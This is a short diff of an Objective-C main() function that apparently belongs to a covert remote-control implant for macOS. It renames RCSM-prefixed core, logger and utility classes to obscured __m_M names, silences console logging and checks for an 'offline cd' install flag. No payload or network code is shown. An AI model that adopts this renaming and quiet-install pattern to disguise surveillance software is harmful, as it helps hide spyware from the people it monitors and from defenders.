@@ -35,7 +35,7 @@ int main (int argc, const char *argv[])
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
 #ifdef ENABLE_LOGGING
-  [RCSMLogger setComponent: @"core"];
+  [__m_MLogger setComponent: @"core"];
 //  infoLog(@"STARTING");
 #else
   // suppress every logging in console
@@ -64,8 +64,8 @@ int main (int argc, const char *argv[])
   NSString *offlineFlagPath = [[NSString alloc] initWithFormat: @"%@/off.flg",
                                [[NSBundle mainBundle] bundlePath]];
   
-  gUtil = [RCSMUtils sharedInstance];
-  RCSMCore *core = [[RCSMCore alloc] init];
+  gUtil = [__m_MUtils sharedInstance];
+  __m_MCore *core = [[__m_MCore alloc] init];
   
   //
   // Check if we've been installed by offline cd
